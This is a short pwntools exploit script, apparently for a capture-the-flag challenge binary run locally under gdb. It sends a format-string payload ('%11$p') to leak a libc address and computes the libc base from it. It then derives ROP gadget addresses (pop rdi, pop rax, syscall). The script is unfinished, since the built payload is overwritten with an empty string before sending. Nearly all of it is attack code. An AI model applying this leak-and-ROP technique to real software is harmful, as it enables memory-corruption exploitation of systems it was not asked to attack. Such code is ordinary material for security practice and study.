from pwn import *

binary = './attachment_patched'
libc = ELF('./libc.so.6')

p = process(binary)

s = '''
b * printf
'''


payload = b"%11$p" # can only leak one address
gdb.attach(p, s)
p.sendline(payload)


p.recvuntil(b"give you one chance!!!\n")

leak = p.recvuntil("begin", drop = True).strip().decode()
leak = int(leak, 16)
libc_base = leak - 0x24083


# gadgets

pop_rdi = libc_base + 0x0000000000023b6a
pop_rax = libc_base + 0x0000000000036174
syscall = libc_base + 0x000000000002284d

print(hex(leak))

payload = flat(
	p64(pop_rdi)
)
payload = ""
p.sendline(payload)


p.interactive()
